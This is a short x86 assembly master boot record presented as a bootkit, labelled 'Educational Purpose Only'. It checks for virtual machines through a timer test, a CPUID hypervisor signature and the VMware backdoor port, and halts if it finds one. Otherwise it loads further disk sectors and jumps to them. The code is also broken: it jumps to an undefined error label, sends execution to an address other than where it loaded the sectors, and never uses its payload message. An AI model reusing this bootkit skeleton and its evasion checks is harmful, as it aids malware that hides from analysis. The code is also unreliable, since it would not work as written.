; ================================================
; BOOTKIT MBR - Educational Purpose Only
; ================================================
[org 0x7C00]
[bits 16]

start:
    cli
    cld    
    push ax
    push bx
    push cx
    push dx
    push si
    push di
    push es
    push ds

    xor ax, ax
    mov ds, ax
    mov es, ax

    mov ax, 0x0000
    int 0x1A
    cmp dx, 0x1234
    je  is_vm

    mov eax, 0x40000000
    cpuid
    cmp ecx, 0x4D566572
    je  is_vm

    mov dx, 0x5658
    in  al, dx
    cmp al, 0x00
    je  is_vm

    jmp not_vm

is_vm:
    mov si, msg_vm
    call print_string
    jmp halt
not_vm:
    mov ax, 0x9000
    mov es, ax
    xor bx, bx
    mov ah, 0x02
    mov al, 0x04
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    jc  disk_error

    jmp 0x0000:0x7C00 + MBR_BACKUP_OFFSET

print_string:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print_string
.done:
    ret

halt:
    hlt
    jmp halt

msg_vm db "Running in Virtual Machine - Exiting...", 0x0D, 0x0A, 0
msg_payload db "Bootkit Loaded Successfully!", 0x0D, 0x0A, 0

MBR_BACKUP_OFFSET equ 0x0200

times 510-($-$$) db 0
db 0x55, 0xAA
